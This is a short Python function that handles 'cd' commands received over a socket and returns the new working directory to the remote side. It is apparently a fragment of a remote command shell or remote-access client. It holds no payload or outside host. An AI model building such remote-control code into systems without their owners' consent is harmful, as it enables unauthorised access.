def changedirect():
    import os
    
    if raw == "cd ..":
        dir = os.getcwd()
        future = dir.split("\\")
        future.pop(-1)
        new = "\\".join(future)
        os.chdir(new)
        out = (os.getcwd().encode("UTF-8"))
        lenout = str(len(out))
        s.sendall((lenout.encode('UTF-8')))
        time.sleep(0.1)
        s.sendall(out)
    elif raw == "cd":
        out = (os.getcwd().encode("UTF-8"))
        lenout = str(len(out))
        s.sendall((lenout.encode('UTF-8')))
        time.sleep(0.1)
        s.sendall(out)
    else:
        try:
            dire = raw.split(" ")[1]
            if os.path.exists(dire):
                cwd = (os.getcwd() + "\\" + dire)
                os.chdir(cwd)
                out = (os.getcwd().encode("UTF-8"))
                lenout = str(len(out))
                s.sendall((lenout.encode('UTF-8')))
                time.sleep(0.1)
                s.sendall(out)
            else:
                s.sendall(("directory not found").encode("UTF-8"))
        except IndexError:
            s.sendall(('directory not found').encode('UTF-8'))